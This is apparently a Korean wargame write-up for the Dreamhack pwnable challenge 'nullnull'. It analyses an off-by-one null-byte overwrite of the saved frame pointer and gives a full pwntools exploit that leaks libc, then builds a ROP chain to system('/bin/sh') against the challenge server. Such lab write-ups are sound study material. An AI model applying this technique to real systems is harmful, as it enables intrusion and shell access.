---
title: "nullnull writeup"
date: 2026-05-06 00:20:00 +0900
categories: [Wargame, Dreamhack, Pwnable]
tags: [pwn, rop, off-by-one, dreamhack]
---

## Analysis

### checksec

```
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        PIE enabled
    RUNPATH:    b'.'
    SHSTK:      Enabled
    IBT:        Enabled
```

### Source Code

```c
int sub_13BD()
{
  char s[80]; // [rsp+0h] [rbp-50h] BYREF

  if ( (unsigned int)__isoc99_scanf("%80s", s) != 1 )
    _exit(1);
  return puts(s);
}

__int64 sub_1445()
{
  __int64 v1; // [rsp+8h] [rbp-8h] BYREF

  if ( (unsigned int)__isoc99_scanf("%ld", &v1) != 1 )
    _exit(1);
  return v1;
}

__int64 __fastcall sub_13FF(__int64 a1)
{
  __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = sub_1445();
  if ( v2 < 0 )
    return 0;
  if ( v2 < a1 )
    return v2;
  return a1 - 1;
}

__int64 __fastcall sub_12F0(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  _QWORD *v4; // rbx
  __int64 v5; // rax

  while ( 1 )
  {
    while ( 1 )
    {
      v2 = sub_1445();
      if ( v2 != 3 )
        break;
      v5 = sub_13FF(a1);
      printf("%ld\n", *(_QWORD *)(8 * v5 + a2));
    }
    if ( v2 > 3 )
      break;
    switch ( v2 )
    {
      case 2LL:
        v4 = (_QWORD *)(8 * sub_13FF(a1) + a2);
        *v4 = sub_1445();
        break;
      case 0LL:
        return 1;
      case 1LL:
        sub_13BD();
        break;
      default:
        return 0;
    }
  }
  return 0;
}

void __fastcall __noreturn main(int a1, char **a2, char **a3)
{
  _BYTE v3[256]; // [rsp+0h] [rbp-100h] BYREF

  do
    memset(v3, 0, sizeof(v3));
  while ( (unsigned __int8)sub_12F0(32, v3, 32) );
  _exit(0);
}
```

소스 코드를 요약하면, 무한 루프를 돌면서 번호를 입력받고 해당하는 기능을 실행한다. 1은 최대 80바이트 추가 입력을 받고 그것을 출력한다. 2는 메인 함수의 버퍼 안에 원하는 위치에 8바이트 단위로 쓸 수 있다. 3은 메인 함수의 버퍼 안에 있는 원하는 위치의 값을 8바이트 단위로 읽을 수 있다.

## Vulnerability Analysis

우선 2, 3에서 읽고 쓰는 것은 범위가 버퍼 안으로 한정되어 있어서 이것만으로는 무언가를 할 수 없다. 그러나 1을 담당하는 `sub_13BD`를 자세히 보면 버퍼가 80바이트인데 scanf 포맷 지정자가 `%80s`로 되어 있다. 이 scanf 지정자는 입력받은 것을 버퍼에 쓰고 끝에 반드시 널바이트를 붙인다. 따라서 80바이트를 꽉 채워 전송하면 SFP의 하위 1바이트를 널바이트로 덮을 수 있다.

나는 SFP가 바뀌어 발생할 수 있는 상황을 크게 두 가지로 분류한다. 하나는 caller의 rbp가 변하므로, caller에서 rbp를 기준으로 접근하는 데이터가 바뀐다. 두 번째로는 caller가 `leave; ret` 할 때 rsp가 바뀐 rbp로 변하면서 바뀐 rbp+8에 있는 주소로 점프한다.

이 문제를 풀 당시에 off-by-one 취약점은 바로 보였으나 어떻게 익스플로잇할지에 대한 아이디어를 찾기가 정말 어려웠다. 우선 SFP의 하위 1바이트를 널바이트로 덮으면, caller의 rbp가 `16바이트 * 0~15 사이의 랜덤한 값`만큼 내려앉을 것이다. 그렇다면 rbp를 기준으로 접근하는 데이터의 위치도 그만큼 내려앉을 것이다. rbp를 기준으로 접근하는 데이터가 무엇인지 확인하기 위해 `sub_12F0`의 어셈블리를 살펴보자.

```
pwndbg> x/60i 0x5555555552f0
   0x5555555552f0:      endbr64 
   0x5555555552f4:      push   rbp
   0x5555555552f5:      mov    rbp,rsp
   0x5555555552f8:      push   rbx
   0x5555555552f9:      sub    rsp,0x18
   0x5555555552fd:      mov    QWORD PTR [rbp-0x18],rdi
   0x555555555301:      mov    QWORD PTR [rbp-0x20],rsi
   0x555555555305:      mov    eax,0x0
   0x55555555530a:      call   0x555555555445
   0x55555555530f:      cmp    rax,0x3
   0x555555555313:      je     0x555555555376
   0x555555555315:      cmp    rax,0x3
   0x555555555319:      jg     0x5555555553aa
   0x55555555531f:      cmp    rax,0x2
   0x555555555323:      je     0x55555555534b
   0x555555555325:      cmp    rax,0x2
   0x555555555329:      jg     0x5555555553aa
   0x55555555532b:      test   rax,rax
   0x55555555532e:      je     0x555555555338
   0x555555555330:      cmp    rax,0x1
   0x555555555334:      je     0x55555555533f
   0x555555555336:      jmp    0x5555555553aa
   0x555555555338:      mov    eax,0x1
   0x55555555533d:      jmp    0x5555555553b6
   0x55555555533f:      mov    eax,0x0
   0x555555555344:      call   0x5555555553bd
   0x555555555349:      jmp    0x5555555553b1
   0x55555555534b:      mov    rax,QWORD PTR [rbp-0x18]
   0x55555555534f:      mov    rdi,rax
   0x555555555352:      call   0x5555555553ff
   0x555555555357:      lea    rdx,[rax*8+0x0]
   0x55555555535f:      mov    rax,QWORD PTR [rbp-0x20]
   0x555555555363:      lea    rbx,[rdx+rax*1]
   0x555555555367:      mov    eax,0x0
   0x55555555536c:      call   0x555555555445
   0x555555555371:      mov    QWORD PTR [rbx],rax
   0x555555555374:      jmp    0x5555555553b1
   0x555555555376:      mov    rax,QWORD PTR [rbp-0x18]
   0x55555555537a:      mov    rdi,rax
   0x55555555537d:      call   0x5555555553ff
   0x555555555382:      lea    rdx,[rax*8+0x0]
   0x55555555538a:      mov    rax,QWORD PTR [rbp-0x20]
   0x55555555538e:      add    rax,rdx
   0x555555555391:      mov    rax,QWORD PTR [rax]
   0x555555555394:      mov    rsi,rax
   0x555555555397:      lea    rdi,[rip+0xc66]        # 0x555555556004
   0x55555555539e:      mov    eax,0x0
   0x5555555553a3:      call   0x5555555550d0 <printf@plt>
   0x5555555553a8:      jmp    0x5555555553b1
   0x5555555553aa:      mov    eax,0x0
   0x5555555553af:      jmp    0x5555555553b6
   0x5555555553b1:      jmp    0x555555555305
   0x5555555553b6:      add    rsp,0x18
   0x5555555553ba:      pop    rbx
   0x5555555553bb:      pop    rbp
   0x5555555553bc:      ret
   ...    
```

이 함수는 `main`으로부터 인자로 받은 32와 버퍼 주소를 rdi, rsi 레지스터로 전달받는데, 이후 다른 용도로 레지스터를 사용하기 위해 기존 값을 스택에 백업하고 있다. 그리고 인자로 넘겨진 값들을 rbp를 기준으로 접근하고 있는 모습이다. 이 인자들은 IDA로 디컴파일된 `sub_12F0`에서 `a1`, `a2`라는 이름으로 불리고 있으므로 앞으로 `a1`, `a2`라고 부르겠다.

우선 이 바이너리는 `win()` 같은 함수가 주어지지 않았으므로 쉘을 획득하기 위해서는 libc base를 유출해야만 한다. libc base를 유출하려면 main 스택 프레임의 ret에 있는 `__libc_start_main` 주소를 유출하거나, PIE base를 유출한 후 GOT 엔트리를 읽어야 한다. 문제는 이를 유출하려면 메뉴 3을 이용해야 하는데, 접근 범위가 메인 버퍼 크기 안으로 제한되어 있다는 점이다.

이 문제를 해결하기 위한 아이디어는 `a1`의 값을 매우 큰 값으로 바꾸는 것이다. `a1`, `a2`는 각각 `sub_12F0`에서 `[rbp-0x18]`, `[rbp-0x20]`으로 접근된다. 메뉴 1을 이용해서 SFP의 하위 1바이트를 널바이트로 덮고 return하면, 다시 다른 함수를 호출하기 전까지는 그 스택 프레임의 잔상이 남아있고 그곳엔 SFP, ret 값도 그대로 남아있다. 따라서 널바이트로 덮인 rbp를 기준으로 `[rbp-0x18]`과 `[rbp-0x20]`이 각각 `sub_13BD`의 ret과 SFP를 가리키도록 만들면, `a1`에는 바이너리 코드 주소인 ret 값이 들어가고, `a2`는 여전히 `sub_12F0` 스택 프레임 안쪽이나 그 아래 근처를 가리키게 된다. `a1`의 값은 기존 값 32에 비해 수십 조 단위의 매우 큰 양수이므로 사실상 범위 제한이 사라지게 된다.

`a2 = [rbp-0x20]`이므로, `a2`가 SFP를 가리키게 하려면 `[rbp-0x20]`이 SFP 위치가 되어야 한다. `sub_12F0`의 스택 프레임 크기는 기존 rbp 기준 0x20이다. 메뉴 1인 `sub_13BD`를 호출하면 ret 주소가 push된 후 SFP가 저장되므로, 기존 rbp 기준 거리는 0x30이다. 즉 `기존 rbp - 0x30` 위치에 SFP가 있으므로, 널바이트로 덮인 rbp에서 0x20을 뺀 주소가 SFP 위치와 일치하려면 기존 rbp의 하위 1바이트가 반드시 0x10이어야 한다. 스택 ASLR에서 하위 4비트는 16바이트 정렬로 0으로 고정되므로 하위 1바이트가 0x10이 될 확률은 1/16이다. 따라서 브루트 포스로 이 확률을 뚫어야 한다.

이 확률을 뚫었다면 `a2`는 SFP를 가리키게 된다. 하위 1바이트가 0x10인 상태에서 널바이트로 덮었으므로 기존 rbp에서 정확히 16바이트만큼 내려앉게 된다. 이제 libc base를 구하기 위해 `main` 스택 프레임의 ret에서 `__libc_start_main` 주소를 유출할 수 있다. 정확한 오프셋 계산을 위해 `main`의 스택 프레임 크기를 알아야 한다.

```
pwndbg> x/20i 0x555555555209
   0x555555555209:      endbr64
   0x55555555520d:      push   rbp
   0x55555555520e:      mov    rbp,rsp
   0x555555555211:      sub    rsp,0x100
   0x555555555218:      lea    rax,[rbp-0x100]
   0x55555555521f:      mov    rsi,rax
   0x555555555222:      mov    eax,0x0
   0x555555555227:      mov    edx,0x20
   0x55555555522c:      mov    rdi,rsi
   0x55555555522f:      mov    rcx,rdx
   0x555555555232:      rep stos QWORD PTR es:[rdi],rax
   0x555555555235:      lea    rax,[rbp-0x100]
   0x55555555523c:      mov    rsi,rax
   0x55555555523f:      mov    edi,0x20
   0x555555555244:      call   0x5555555552f0
   0x555555555249:      test   al,al
   0x55555555524b:      jne    0x555555555218
   0x55555555524d:      mov    edi,0x0
   0x555555555252:      call   0x5555555550b0 <_exit@plt>
   ...
```

`main`의 스택 프레임 크기는 rbp 기준 0x100이다. 바뀐 rbp는 16바이트 내려앉았고, 기존 rbp 위치에는 SFP와 ret이 저장되어 있다. `main` 스택 프레임 크기가 0x100이고 ret은 그보다 +8에 있으므로, `a2`에서 `main` 스택 프레임의 ret까지의 거리는 `16 + 16 + 0x100 + 8 = 296`이다. `296 / 8 = 37`이므로 인덱스 37로 메뉴 3을 이용해 `__libc_start_main` 주소를 유출하면 libc base를 구할 수 있다.

libc base를 구했다면, 메뉴 2로 ROP 체인을 구성하기 위해 `sub_12F0`의 스택 프레임 ret과 `a2` 간의 거리만 계산하면 된다. 기존 rbp 기준 ret은 +8에 있고 바뀐 rbp는 16바이트 내려앉았으므로, ret과의 거리는 24이다. 이 거리를 바탕으로 ROP 체인을 구성하면 쉘을 획득할 수 있다.

## Exploit

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./nullnull")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host8.dreamhack.games", 17412)

    return r

def leak_qword(r, idx):
    r.sendline(b"3")
    r.sendline(str(idx).encode())
    return int(r.recvline()[:-1])

def write_qword(r, idx, value):
    r.sendline(b"2")
    r.sendline(str(idx).encode())
    r.sendline(str(value).encode())

def main():
    while True:
        r = conn()
        r.sendline(b"1")
        r.sendline(b"A" * 80)
        r.recvline()
        try:
            __libc_start_main = leak_qword(r, 37) - 243
            if len(str(__libc_start_main)) == 15:
                libc.address = __libc_start_main - libc.symbols["__libc_start_main"]
                break
        except:
            r.close()
    
    log.success(f"libc base: {hex(libc.address)}")

    system = libc.symbols["system"]
    binsh = next(libc.search(b"/bin/sh\x00"))
    rop = ROP(libc)
    rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
    ret_gadget = rop.find_gadget(["ret"])[0]

    write_qword(r, 3, ret_gadget)
    write_qword(r, 4, rdi_gadget)
    write_qword(r, 5, binsh)
    write_qword(r, 6, system)

    r.sendline(b"0")

    r.interactive()


if __name__ == "__main__":
    main()
```